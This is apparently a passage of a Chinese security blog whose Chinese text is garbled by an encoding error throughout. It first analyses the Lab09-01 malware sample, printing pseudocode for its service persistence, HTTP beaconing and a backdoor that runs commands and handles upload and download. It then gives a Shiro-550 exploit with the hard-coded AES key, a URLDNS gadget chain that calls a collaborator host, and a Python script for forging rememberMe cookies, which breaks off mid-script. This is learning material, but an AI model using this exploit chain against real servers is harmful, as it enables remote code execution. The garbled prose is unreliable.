å¤§ä½“å°±æ˜¯å¾—åˆ°æœ¬åœ°æ–‡ä»¶è·¯å¾„ï¼Œæ‹¼å‡‘å­—ç¬¦ä¸²åœ¨æœ¬åœ°å°è¯•å¯ä»¥çœ‹åˆ°æ­¤å‘½ä»¤ä¸ºåˆ é™¤æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶(æ€ªä¸å¾—æ¯æ¬¡ç‚¹å‡»exeæ–‡ä»¶å°±æ²¡äº†ï¼Œè¿˜ä»¥ä¸ºé˜²ç«å¢™åˆ äº†emm)è°ƒç”¨SHELL32çš„ShellExecuteå‡½æ•°æ‰§è¡Œæ‹¼æ¥çš„å­—ç¬¦ä¸²ï¼Œä½†ç”±äºå·²åœ¨odä¸­æ‰“å¼€ï¼Œæ‰€ä»¥ä¸ä¼šåˆ é™¤æ¥ç€å¾€ä¸‹çœ‹ï¼Œä¼ å…¥å‚æ•°-inåcall 40380f åœ¨mainå‡½æ•°ä¸­æ‰¾åˆ°__mbscmpç›¸å…³è°ƒç”¨ï¼ˆcallçš„40380fï¼‰ï¼Œæ­¤å‡½æ•°æ˜¯æ¯”è¾ƒå­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰çš„ æ­¤å‡½æ•°ï¼ˆ40380fï¼‰çš„è¿”å›å€¼ä¸º910000 å¯ä»¥çœ‹åˆ°å‚æ•°-c -cc -re- in å‚æ•° åœ°å€ åŠŸèƒ½ -in .text:00402600 -c -cc .text:0x401280 -re æ¥ç€å¾€ä¸‹çœ‹ï¼Œæ·»åŠ -inå‚æ•°åCtrl+F2é‡æ–°è°ƒè¯• å¯è§è·³è¿‡åˆ é™¤è‡ªèº«ï¼Œpushå‚æ•°call 402510 åˆ†æ402510å‡½æ•°ï¼Œå‘ç°å¯¹ä¼ å…¥å‚æ•°è¿›è¡Œæ˜¯å¦ä¸ºabcdçš„æ ¡éªŒ æ ¡éªŒå¤±è´¥ï¼Œcall 402410å‡½æ•°ï¼Œå°±æ˜¯ä¹‹å‰åˆ é™¤è‡ªèº«çš„å‡½æ•° æ”¹å˜å‚æ•°ä¸º-in abcdï¼Œå³å¯è·³è¿‡ call 0040380ï¼Œidaåˆ†æä¸º_mbscmpå‡½æ•° call 4025B0 è¯¥å‡½æ•°ä½œç”¨ä¸ºè·å–æ–‡ä»¶åä¸”è¿”å›result&#x3D;0 æ¥ç€å¾€ä¸‹èµ°ï¼Œcall 402600 åº”è¯¥æ˜¯æœ€é‡è¦çš„å¯¹åº”å‚æ•°å‡½æ•° å¯ä»¥çœ‹åˆ°æ‰€ä¼ å‚æ•°ä¸º4025B0çš„è¿”å›å€¼ï¼ˆå³å½“å‰æ–‡ä»¶æ–‡ä»¶åï¼‰ è·Ÿè¿›åçœ‹åˆ°calläº†_alloca_probeï¼ˆå¯èƒ½ä¸æ³¨å†Œå†…å­˜æœ‰å…³ï¼Œå…ˆä¸ç®¡ï¼‰å’Œ4025b0ï¼ˆå…ˆå‰åˆ†æè¿‡ä¸ºæˆªå–æ–‡ä»¶åï¼‰ æ¥ç€è·Ÿè¿›å‘ç°è·³è½¬åˆ°402632ï¼Œå‘ç°æ­¤å‡½æ•°å‰éƒ¨åˆ†æ˜¯å®ç°æ‹¼æ¥å­—ç¬¦ä¸²%SYSTEMROOT%\\system32\\Lab09-01.exeçš„æ“ä½œï¼Œç„¶åè°ƒç”¨OpenScManagerA å¯ä»¥OpenScManagerAä¼ å…¥å‚æ•°ä¸º3ä¸ªç«‹å³æ•°ï¼Œä¹‹å‰åˆ†æçŸ¥é“å®ƒè¿”å›ä¸€ä¸ªæœåŠ¡æ§åˆ¶ç®¡ç†å™¨å¥æŸ„ï¼Œæ‰€æœ‰è¦å’ŒæœåŠ¡äº¤äº’çš„ä»£ç ä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼› å¯¹äºè¿™ç§å®˜æ–¹APIå‡½æ•°å¯ä»¥è·³è¿‡ æ¥ç€è°ƒç”¨OpenServiceå‡½æ•°ï¼Œå‚æ•°ä¸ºè‡ªèº«æ–‡ä»¶åï¼Œå¯ä»¥åˆ¤æ–­å¼€å¯ä¸€ä¸ªè‡ªèº«æœåŠ¡ æ¥ç€è°ƒç”¨ChangeServiceConfigAå’ŒCloseServiceå‡½æ•° å…¶ä¸­ChangeServiceConfigAæ‰€ä¼ å‚æ•°å¦‚ä¸‹ï¼ŒhServiceä¸ºä¹‹å‰å¼€å¯çš„è‡ªèº«æœåŠ¡ å†å¾€ä¸‹å‘ç°å°±è·³å‡ºäº†402600å‡½æ•°ï¼Œå› æ­¤å¯ä»¥æ¨æ–­-inå‚æ•°ä¸ºåˆ›å»ºæœåŠ¡åŠŸèƒ½ï¼Œida F5ä¼ªä»£ç å¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172int __cdecl sub_402600(LPCSTR lpServiceName)&#123; int result; // eax@2 SC_HANDLE hService; // [sp+Ch] [bp-1408h]@5 SC_HANDLE hServicea; // [sp+Ch] [bp-1408h]@9 char v4; // [sp+10h] [bp-1404h]@1 CHAR Filename; // [sp+410h] [bp-1004h]@14 CHAR DisplayName; // [sp+810h] [bp-C04h]@9 CHAR BinaryPathName; // [sp+C10h] [bp-804h]@6 SC_HANDLE hSCManager; // [sp+1010h] [bp-404h]@3 CHAR Src; // [sp+1014h] [bp-400h]@3 if ( sub_4025B0(&amp;v4) ) return 1; strcpy(&amp;Src, aSystemrootSyst); //aSystemrootSyst==%SYSTEMROOT%\\system32\\ strcat(&amp;Src, &amp;v4); strcat(&amp;Src, a_exe); hSCManager = OpenSCManagerA(0, 0, 0xF003Fu); //è°ƒç”¨OpenSCManagerAï¼Œæ‰“å¼€ä¸€ä¸ªæœåŠ¡ç®¡ç†å™¨ï¼Œ if ( !hSCManager ) return 1; hService = OpenServiceA(hSCManager, lpServiceName, 0xF01FFu); //æœåŠ¡å³è‡ªèº«exeï¼Œåˆ›å»ºä¸€ä¸ªæœåŠ¡ï¼Œ if ( hService ) //å¦‚æœæœåŠ¡å·²ç»åˆ›å»ºæ‰“å¼€æœåŠ¡ &#123; if ( !ChangeServiceConfigA(hService, 0xFFFFFFFF, 2u, 0xFFFFFFFF, &amp;BinaryPathName, 0, 0, 0, 0, 0, 0) ) &#123; //å¹¶æ·»åŠ è¿›å¯åŠ¨é¡¹ CloseServiceHandle(hService); CloseServiceHandle(hSCManager); return 1; &#125; CloseServiceHandle(hService); CloseServiceHandle(hSCManager); &#125; else &#123; strcpy(&amp;DisplayName, lpServiceName); strcat(&amp;DisplayName, aManagerService); //åˆ›å»ºä¸€ä¸ªæœåŠ¡ hServicea = CreateServiceA(hSCManager, lpServiceName, &amp;DisplayName, 0xF01FFu, 0x20u, 2u, 1u, &amp;Src, 0, 0, 0, 0, 0); if ( !hServicea ) &#123; CloseServiceHandle(hSCManager); return 1; &#125; CloseServiceHandle(hServicea); CloseServiceHandle(hSCManager); &#125; if ( ExpandEnvironmentStringsA(&amp;Src, &amp;BinaryPathName, 0x400u) ) &#123; if ( GetModuleFileNameA(0, &amp;Filename, 0x400u) ) &#123; if ( CopyFileA(&amp;Filename, &amp;BinaryPathName, 0) ) //å°†è‡ªå·±å¤åˆ¶åˆ° %SYSTEMROOT%\\\\system32\\\\xxxï¼Œå³å†™è¿›system32ç›®å½• &#123; if ( sub_4015B0(&amp;BinaryPathName) ) result = 1; else result = sub_401070(aUps, aHttpWww_practi, a80, a60) != 0; &#125; else &#123; result = 1; &#125; &#125; else &#123; result = 1; &#125; &#125; else &#123; result = 1; &#125; return result;&#125; å¯ä»¥çœ‹åˆ°å·²å¯åŠ¨è‡ªèº«æœåŠ¡ è‡³æ­¤ï¼Œ-inå‚æ•°åˆ†æç»“æŸ æ¥ç€åˆ†æ-reå‚æ•° ä¿®æ”¹å‚æ•°ä¸º-re abcd ç»è¿‡_mbscmpå‡½æ•°åeaxè¿”å›å€¼ä¸º1ï¼Œè·³è½¬åˆ°-reå‚æ•° æ¥ç€å’Œ-inå‚æ•°ä¸€æ ·call 40380fæ¯”è¾ƒå­—ç¬¦ä¸²,call 4025b0è·å–æ–‡ä»¶å æ¥ç€call 402900è¿›å…¥-reå‚æ•°å‡½æ•° åæ±‡ç¼–æŸ¥çœ‹ä»£ç ,åˆæ­¥åˆ¤æ–­ä¸ºåˆ é™¤æœåŠ¡çš„ï¼Œodè·Ÿè¿›çœ‹çœ‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667int __cdecl sub_402900(LPCSTR lpServiceName)&#123; int result; // eax@2 SC_HANDLE hService; // [sp+Ch] [bp-C08h]@3 char v3; // [sp+10h] [bp-C04h]@7 CHAR Dst; // [sp+410h] [bp-804h]@9 SC_HANDLE hSCManager; // [sp+810h] [bp-404h]@1 CHAR Src; // [sp+814h] [bp-400h]@9 hSCManager = OpenSCManagerA(0, 0, 0xF003Fu); if ( hSCManager ) &#123; hService = OpenServiceA(hSCManager, lpServiceName, 0xF01FFu); if ( hService ) &#123; if ( DeleteService(hService) ) &#123; CloseServiceHandle(hSCManager); CloseServiceHandle(hService); if ( sub_4025B0(&amp;v3) ) &#123; result = 1; &#125; else &#123; strcpy(&amp;Src, aSystemrootSyst); strcat(&amp;Src, &amp;v3); strcat(&amp;Src, a_exe); if ( ExpandEnvironmentStringsA(&amp;Src, &amp;Dst, 0x400u) ) &#123; if ( DeleteFileA(&amp;Dst) ) &#123; if ( sub_401070(&amp;unk_40EB60, &amp;unk_40EB60, &amp;unk_40EB60, &amp;unk_40EB60) ) result = 1; else result = sub_401210() != 0; &#125; else &#123; result = 1; &#125; &#125; else &#123; result = 1; &#125; &#125; &#125; else &#123; CloseServiceHandle(hSCManager); CloseServiceHandle(hService); result = 1; &#125; &#125; else &#123; CloseServiceHandle(hSCManager); result = 1; &#125; &#125; else &#123; result = 1; &#125; return result;&#125; åŒæ ·çš„æµç¨‹ï¼Œåªä¸è¿‡openæ”¹ä¸ºdeleteService è·Ÿè¿›å‘ç°æœåŠ¡å·²ç¦ç”¨ æ¥ç€deletefile åˆ°æ­¤ï¼Œå¯¹äº-reå‚æ•°åŠŸèƒ½çš„åˆ†æå·²ç»ç»“æŸï¼Œæˆ‘ä»¬çŸ¥é“è¿™æ˜¯åˆ é™¤æœåŠ¡åŠŸèƒ½ï¼› ä¸‹é¢åˆ†æ-cå‚æ•° ä¿®æ”¹å‚æ•°ä¸º-c abcd è¿›å…¥è°ƒè¯•æ‰§è¡Œï¼Œæ­¤å¤„åº”è¯¥å°±æ˜¯-cå‚æ•°ä»£ç æ®µ å¯ä»¥çœ‹åˆ°æœ‰2ä¸ªjnzè·³è½¬(402cd9,402ccf) å› ä¸ºå‚æ•°ä¸º-cæ‰€ä»¥402cd9ä¸è·³è½¬ï¼Œæ¥ä¸‹æ¥åˆ†æä¸‹402ccf,odä¸­æ˜¯è·³è½¬äº†çš„ ç®€å•åæ±‡ç¼–ä¸€ä¸‹å¯ä»¥çœ‹åˆ°ï¼Œåˆ¤æ–­å‚æ•°æ˜¯å¦ä¸º7 å¦‚æœä¸ä¸º7ï¼Œåˆ™call 402410,ä¹‹å‰åˆ†æè¿‡è¿™ä¸ªå‡½æ•°æ˜¯åˆ é™¤è‡ªèº« æ›´æ”¹å‚æ•°å¦‚å›¾ï¼Œå®é™…æŒ‡ä»¤ä¸º(xxxx.exe -c 111 222 333 444 abcd)å…±7ä¸ªå‚æ•°ï¼Œåé‡æ–°è°ƒè¯• å¯ä»¥çœ‹åˆ°è¿›å…¥401070å‡½æ•°ï¼Œå¹¶å¯¹è¾“å…¥çš„å‚æ•°111 222 333 444å¤„ç† å‚æ•°å…¥æ ˆåè°ƒç”¨401070,åº”è¯¥å°±æ˜¯-cçš„å‡½æ•°äº†ï¼Œè¿›å…¥çœ‹çœ‹ å¤§æ¦‚æ„æ€å°±æ˜¯åˆ›å»ºæ³¨å†Œè¡¨keyï¼Œç„¶åè®¾ç½®valueï¼Œä¸€æ­¥ä¸€æ­¥è·Ÿè¿› æ‰“å¼€æ³¨å†Œè¡¨æŒ‰ç…§å‚æ•°å‘ç°é›€æ°æ·»åŠ äº†æ‰€ä¼ å…¥çš„å‚æ•° æ¥ç€è·³å‡ºmainå‡½æ•°ï¼Œç»“æŸ è‡³æ­¤-c å‚æ•°åˆ†æå®Œæ¯•ï¼Œå³å‘æŒ‡å®šæ³¨å†Œè¡¨æ·»åŠ value æ¥ç€åˆ†æ-cc abcd æœ‰ä¸¤ä¸ªè·³è½¬ï¼Œodè·Ÿè¿›å‘ç°å¹¶æ²¡æœ‰è·³è½¬ï¼Œå…ˆè¿‡ã€‚æ¥ç€call 401280 åæ±‡ç¼–æŸ¥çœ‹ä»£ç  å¤§æ¦‚å°±æ˜¯æ³¨å†Œè¡¨æŸ¥value æ‰“å¼€æ³¨å†Œè¡¨ï¼Œç„¶åæŸ¥å€¼ è·³å‡º401280åcall 402e74ï¼ˆæ„Ÿè§‰æƒ³printfå‡½æ•°ï¼‰ å‘ç°å°†æŸ¥è¯¢åˆ°çš„valueæ‰“å°å‡ºæ¥ï¼Œç„¶ååˆ é™¤è‡ªèº«ï¼Œç»“æŸ æ¥ä¸‹æ¥åˆ†ææ— å‚ï¼Œè®¾ç½®å‚æ•°ä¸ºabcd è·³è½¬è‡³æ­¤401000ï¼Œ æ¥ç€call 402360 å‘ç°æ˜¯ä¸€ä¸ªæ­»å¾ªç¯ï¼Œä¸”é€šè¿‡401280å’Œ402020è·³å‡ºå¾ªç¯ æŸ¥çœ‹401280 çŒœæµ‹å¦‚æœæŸ¥è¯¢æ³¨å†Œè¡¨ä¸­çš„valueï¼Œåˆ™è·³å‡ºå¾ªç¯ æŸ¥çœ‹402020 ä»£ç è¾ƒé•¿ä¸æ”¾äº† å…ˆcalläº†401e60 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162signed int __cdecl sub_401E60(char *a1, signed int a2)&#123; signed int result; // eax@2 u_short hostshort[2]; // [sp+8h] [bp-1424h]@3 char name; // [sp+Ch] [bp-1420h]@1 char *v5; // [sp+40Ch] [bp-1020h]@11 int v6; // [sp+410h] [bp-101Ch]@1 char *v7; // [sp+414h] [bp-1018h]@13 int v8; // [sp+418h] [bp-1014h]@5 char *v9; // [sp+428h] [bp-1004h]@9 char v10; // [sp+42Ch] [bp-1000h]@7 v6 = 4096; if ( sub_401420(&amp;name, 1024) ) &#123; result = 1; &#125; else if ( sub_401470(hostshort) ) &#123; result = 1; &#125; else if ( sub_401D80(&amp;v8) ) &#123; result = 1; &#125; else if ( sub_401AF0(&amp;name, hostshort[0], (int)&amp;v8, &amp;v10, (int)&amp;v6) ) &#123; result = 1; &#125; else &#123; v9 = strstr(&amp;v10, asc_40C090); if ( v9 ) &#123; v5 = v9; v9 = strstr(v9, asc_40C088); if ( v9 ) &#123; v7 = v9; if ( v9 - v5 + 1 &lt;= a2 ) &#123; qmemcpy(a1, &amp;v5[strlen(asc_40C090)], v7 - v5 - strlen(asc_40C090)); a1[v7 - v5 - strlen(asc_40C090)] = 0; result = 0; &#125; else &#123; result = 1; &#125; &#125; else &#123; result = 1; &#125; &#125; else &#123; result = 1; &#125; &#125; return result;&#125; å…¶ä¸­401420ä¸­è°ƒç”¨äº†401280ï¼Œå³-ccå‚æ•°ï¼Œå°±æ˜¯æŸ¥è¯¢value æ¥ç€calläº†401470ï¼Œè¿›å»çœ‹åˆ°calläº†401280å’Œ402f6a æ¥ç€calläº†401d80 å…ˆè·å–äº†å½“å‰æ—¶é—´time ç„¶å4030e0å‡½æ•°å°†40C180çš„å€¼èµ‹ä¸ºtime æ¥ç€call 401D10ï¼Œè·Ÿè¿›å»çœ‹ è¿”å›ä¸€ä¸ªä¸æ˜¯æ•°å­—&amp;&amp;ä¸æ˜¯å°å†™å­—æ¯&amp;&amp;ä¸æ˜¯å¤§å†™å­—æ¯çš„v1ï¼ˆæ­¤å¤„è¿”å›çš„æ˜¯54ï¼‰ ä¸æ»¡è¶³æ¡ä»¶æ¥ç€ä¸€ç›´å¾ªç¯ è·³å‡ºï¼Œæ¥ç€call 401AF0ï¼Œå‚æ•°å¦‚æ ˆä¸­æ‰€ç¤º ä»£ç å¦‚ä¸‹ï¼Œå’Œsocketç½‘ç»œé€šä¿¡æœ‰å…³ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556int __cdecl sub_401AF0(char *name, u_short hostshort, int a3, char *a4, int a5)&#123; int result; // eax@2 char v6; // [sp+10h] [bp-60Ch]@5 SOCKET s; // [sp+210h] [bp-40Ch]@1 int v8; // [sp+214h] [bp-408h]@1 char buf; // [sp+218h] [bp-404h]@3 int v10; // [sp+618h] [bp-4h]@5 s = 0; v8 = 0; if ( sub_401640((int)&amp;s, name, hostshort) ) return 1; strcpy(&amp;buf, aGet); strcat(&amp;buf, (const char *)a3); strcat(&amp;buf, aHttp1_0); if ( send(s, &amp;buf, strlen(&amp;buf), 0) == -1 ) &#123; closesocket(s); WSACleanup(); return 1; &#125; do &#123; v10 = recv(s, &amp;v6, 512, 0); if ( v10 &lt;= 0 ) &#123; if ( v10 ) &#123; sub_401740(&amp;s); return 1; &#125; continue; &#125; if ( (unsigned int)(v10 + v8) &gt; *(_DWORD *)a5 ) &#123; sub_401740(&amp;s); return 1; &#125; qmemcpy(&amp;a4[v8], &amp;v6, v10); v8 += v10; if ( strstr(a4, asc_40C068) ) break; &#125; while ( v10 &gt; 0 ); if ( sub_401740(&amp;s) ) &#123; result = 1; &#125; else &#123; *(_DWORD *)a5 = v8; result = 0; &#125; return result;&#125; çºµè§‚ä»¥ä¸Šï¼Œå¯ä»¥å¾—åˆ°401e60ä¸»è¦åŠŸèƒ½ä¸ºä»¥ä¸‹ 12345678910111213141516171819202122232425262728293031323334353637int _cdecl sub_401E60(cahr *a1,signed int a2)&#123; signed int result; if(sub_401420(...))&#123; // è·å–æ³¨å†Œè¡¨é”®å¹¶æˆªå– result = 1; &#125; else if(sub_401470(...))&#123; // è·å–æ³¨å†Œè¡¨é”® result = 1; &#125; else if(sub_401D80(...))&#123; // æ— èŠçš„å»¶æ—¶ resutl = 1; &#125; else if(sub_401AF0(...))&#123; // ç½‘ç»œGetå’Œrecv result = 1; &#125; else&#123; if(a = strstr(...))&#123; // å­—ç¬¦ä¸²åŒ¹é… if(b = strstr(...))&#123; if(b - a + 1 &lt;= a2)&#123; memcpy(a1 , ...); // å¤åˆ¶ a1[...] = 0; result = 0; &#125; else&#123; result = 1; &#125; &#125; else&#123; result = 1; &#125; &#125; else&#123; result = 1; &#125; &#125; return result;&#125; å¦‚æœè·å–å­—ç¬¦ä¸²æˆåŠŸï¼Œåˆ™è¿›å…¥40204Cï¼Œå¯ä»¥çœ‹åˆ°ç±»ä¼¼äºä¸€ä¸ªåé—¨åŠŸèƒ½ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465int __cdecl sub_402020(char *name)&#123; const char *v2; // ST2C_4@4 int v3; // ST30_4@4 char *v4; // eax@6 u_short v5; // ST24_2@6 char *v6; // ST28_4@6 char *v7; // eax@10 u_short v8; // ST1C_2@10 char *lpFileName; // ST20_4@10 char *v10; // eax@14 const char *v11; // ST18_4@14 u_short hostshort; // [sp+4h] [bp-424h]@14 FILE *v13; // [sp+8h] [bp-420h]@14 char v14; // [sp+28h] [bp-400h]@1 if ( sub_401E60(&amp;v14, 1024) ) return 1; if ( !strncmp(&amp;v14, aSleep, strlen(aSleep)) ) &#123; strtok(&amp;v14, asc_40C0C0); v2 = strtok(0, asc_40C0C0); v3 = atoi(v2); Sleep(1000 * v3); &#125; else if ( !strncmp(&amp;v14, aUpload, strlen(aUpload)) ) &#123; strtok(&amp;v14, asc_40C0C0); v4 = strtok(0, asc_40C0C0); v5 = atoi(v4); v6 = strtok(0, asc_40C0C0); if ( sub_4019E0(name, v5, v6) ) return 1; &#125; else if ( !strncmp(&amp;v14, aDownload, strlen(aDownload)) ) &#123; strtok(&amp;v14, asc_40C0C0); v7 = strtok(0, asc_40C0C0); v8 = atoi(v7); lpFileName = strtok(0, asc_40C0C0); if ( sub_401870(name, v8, lpFileName) ) return 1; &#125; else if ( !strncmp(&amp;v14, aCmd, strlen(aCmd)) ) &#123; strtok(&amp;v14, asc_40C0C0); v10 = strtok(0, asc_40C0C0); hostshort = atoi(v10); v11 = strtok(0, asc_40C0A4); v13 = _popen(v11, aRb); if ( !v13 ) return 1; if ( sub_401790(name, hostshort, v13) ) &#123; _pclose(v13); return 1; &#125; _pclose(v13); &#125; else &#123; strncmp(&amp;v14, aNothing, strlen(aNothing)); &#125; return 0;&#125; å¯ä»¥å®ç°cmdï¼Œå’Œupload","categories":[{"name":"æ¶æ„ä»£ç ","slug":"æ¶æ„ä»£ç ","permalink":"http://example.com/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"}],"tags":[{"name":"æ¶æ„ä»£ç ","slug":"æ¶æ„ä»£ç ","permalink":"http://example.com/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"äºŒè¿›åˆ¶","slug":"äºŒè¿›åˆ¶","permalink":"http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"}]},{"title":"Shiroååºåˆ—åŒ–æ¼æ´","slug":"shiro","date":"2022-08-06T13:16:50.000Z","updated":"2022-09-01T00:54:12.897Z","comments":true,"path":"2022/08/06/shiro/","link":"","permalink":"http://example.com/2022/08/06/shiro/","excerpt":"","text":"Shiroç¯å¢ƒæ­å»º æ‰€éœ€ç¯å¢ƒ 123jdk8u65 Tomcat8shiro 1.2.4 shiroç¯å¢ƒç›´æ¥clone pç¥çš„githubåœ°å€ å¯åŠ¨tomcatï¼Œå³å¯çœ‹åˆ° Shiro550åˆ†ææ¼æ´åŸç† å‹¾é€‰ RememberMe å­—æ®µï¼Œç™»é™†æˆåŠŸçš„è¯ï¼Œè¿”å›åŒ… set-Cookie ä¼šæœ‰ rememberMe&#x3D;deleteMe å­— æ®µï¼Œè¿˜ä¼šæœ‰ rememberMe å­—æ®µï¼Œä¹‹åçš„æ‰€æœ‰è¯·æ±‚ä¸­ Cookie éƒ½ä¼šæœ‰ rememberMe å­—æ®µï¼Œé‚£ä¹ˆå°± å¯ä»¥åˆ©ç”¨è¿™ä¸ª rememberMe è¿›è¡Œååºåˆ—åŒ–ï¼Œä»è€Œ getshellã€‚ 1234567891011121314151617181920212223242526////RequestPOST /shirodemo_war/login.jsp HTTP/1.1Host: 192.168.124.15:8081Content-Length: 56Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://192.168.124.15:8081Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://192.168.124.15:8081/shirodemo_war/login.jspAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeusername=root&amp;password=secret&amp;rememberMe=on&amp;submit=Login////ResponseHTTP/1.1 302 Set-Cookie: JSESSIONID=1467280596697A870D71F2A15C2E5B84; Path=/shirodemo_war; HttpOnlySet-Cookie: rememberMe=deleteMe; Path=/shirodemo_war; Max-Age=0; Expires=Mon, 29-Aug-2022 06:06:08 GMTSet-Cookie: rememberMe=TJ1wpcFQ6EgXmXmmHQ06fysKrMk3tVUeNsh42bYAnXePmFLX+a9DUp7SyfQcdXvFBHHEY0lPYFGP4TtwJA8MgiQVNrol9LIHlwzUlSkz2ZkCUkUYgW0aGK1Ben6bfU1wLp56z/ygIC0x1qXDDYzzRhdMHptkdPOCTJ1DVgtDP51AeESfhuKP/EVJI5JS+e/QTXReg8GtYowZ48PvWTf65YGwp+j+/LNCbn1Wsk1V5xYf9P7q2Xmm6Zh4C5nV2siStTq32oVYtmkowJSV9LCCTsjAZ0Nw+p5tGxsIbmJU3viTOh1PnMKT2XDEiYor7Jr/SKnjsWkYBWSkSvLs+sPRGwVXUVI1LZ3er9UIzsgWse/lOjXdJ8uV71CATvqaG+71HDy9S8byDEdIW1kMh7zigLTEKAp2edgJi3X19vIcoQBkB3ZSJSEcAwG3tCTfyeSnMFJjNa3NmJ+jMyYQO3Q/oZkSbn7fGRG5aIX0OILCDI7Mk9k9YnkIfijo60KrJEcc; Path=/shirodemo_war; Max-Age=31536000; Expires=Wed, 30-Aug-2023 06:06:08 GMT; HttpOnlyLocation: /shirodemo_war/;jsessionid=1467280596697A870D71F2A15C2E5B84Content-Length: 0Date: Tue, 30 Aug 2022 06:06:08 GMTConnection: close æ ¹æœ¬åŸå› æ˜¯AES åŠ å¯†çš„å¯†é’¥é»˜è®¤ç¡¬ç¼–ç åœ¨ä»£ç é‡Œï¼ˆShiro-550ï¼‰ cookieè§£å¯†åˆ†æ ideaå…¨å±€æŸ¥æ‰¾cookieå…³é”®å­—ï¼Œå‘ç°ä¸€ä¸‹ä¸shiroæ¡†æ¶ç›¸å…³çš„class 123public interface Cookiepublic class SimpleCookie implements Cookiepublic class CookieRememberMeManager extends AbstractRememberMeManager è·Ÿè¿›CookieRememberMeManageræŸ¥çœ‹ç›¸å…³å‡½æ•° è¿™ä¸ªæ–¹æ³•ä¸­å…ˆåˆ¤æ–­cookie base64åæ˜¯å¦ä¸ºdeletemeï¼Œæ˜¯çš„è¯åˆ™è¿”å›ï¼Œå¦åˆ™baseè§£å¯†åè¿”å›ï¼Œçœ‹çœ‹è°è°ƒç”¨äº†è¿™ä¸ªæ–¹æ³• è·Ÿè¿›convertBytesToPrincipalsçœ‹çœ‹ ã€ æ­¤å‡½æ•°å¯¹base64è§£å¯†åçš„byteæµè¿›è¡Œdecryptï¼Œç„¶åååºåˆ—åŒ–ã€‚è·Ÿè¿›çœ‹çœ‹ è·å–cipherServiceåå¯¹bytesè§£å¯† å…¶ä¸­getDecryptionCipherKey()ä¸ºè·å–åŠ è§£ç§˜é’¥ è·Ÿè¿›cipherServiceå‘ç°ä½¿ç”¨çš„æ˜¯AesåŠ å¯†ï¼Œç§˜é’¥ä¸ºbase64åŠ å¯†çš„kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D; æ€»ç»“ä¸Šè¿°æµç¨‹ï¼Œå‘ç°shiroå¯¹cookieè§£å¯†æµç¨‹ä¸º base64() -&gt; Aes() ä¹‹åå¾—åˆ°åºåˆ—åŒ–å†…å®¹ è·Ÿè¿›ååºåˆ—åŒ–å‡½æ•°æŸ¥çœ‹ cookieåŠ å¯†åˆ†æ åœ¨onSuccessfulLoginä¸‹æ–­ç‚¹ å¯ä»¥çœ‹åˆ°tokenä¸ºæ˜æ–‡ è·Ÿè¿› å¯è§å’Œè§£å¯†è¿‡ç¨‹å¯¹ç§°ï¼Œä»¥ä¸Šå°±æ˜¯cookieåŠ è§£å¯†å…¨è¿‡ç¨‹ shiro550åˆ©ç”¨ DNSæ¢æµ‹ 1234567891011121314151617181920212223242526272829URLDNSé“¾public class urldns &#123; public static void main(String[] args) throws IOException, NoSuchMethodException, InstantiationException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException &#123; HashMap&lt;URL,Object&gt; hashMap = new HashMap&lt;&gt;(); URL url = new URL(&quot;https://fudjktkkeq3jv7koksa072r6exkn8c.burpcollaborator.net&quot;); Class urlClass = URL.class; Field fieldHashCode = urlClass.getDeclaredField(&quot;hashCode&quot;); fieldHashCode.setAccessible(true); fieldHashCode.set(url,123456); hashMap.put(url,123); fieldHashCode.set(url,-1); serialize(hashMap); //unSerialize(&quot;ser.bin&quot;); &#125; public static void serialize(Object obj) throws IOException &#123; ObjectOutputStream ooStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); ooStream.writeObject(obj); &#125; public static Object unSerialize(String fileName) throws IOException, ClassNotFoundException &#123; ObjectInputStream oiStrean = new ObjectInputStream(new FileInputStream(fileName)); Object obj = oiStrean.readObject(); return obj; &#125;&#125; pythonåŠ å¯†è„šæœ¬ 12345678910111213141516171819202122232425from Crypto.Cipher import AESimport uuidimport base64 def convert_bin(file): with open(file,&#x27;rb&#x27;) as f: return f.read() def AES_enc(data): BS=AES.block_size pad=lambda s:s+((BS-len(s)%BS)*chr(BS-len(s)%BS)).encode() key=&quot;kPH+bIxk5D2deZiIxcaaaA==&quot; mode=AES.MODE_CBC iv=uuid.uuid4().bytes encryptor=AES.new(base64.b64decode(key),mode,iv) ciphertext=base64.b64encode(iv+encryptor.encrypt(pad(data))) return ciphertext if __name__==&quot;__main__&quot;: data=convert_bin(&quot;ser.bin&quot;) 